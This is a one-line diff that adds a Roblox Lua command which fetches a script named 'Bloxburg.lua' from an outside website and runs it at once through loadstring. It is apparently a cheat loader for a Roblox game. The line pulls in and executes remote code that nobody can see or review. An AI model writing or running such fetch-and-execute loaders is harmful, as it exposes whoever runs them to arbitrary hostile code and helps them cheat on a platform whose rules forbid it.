@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://aigars.ga/uploads/Bloxburg.lua", true))()
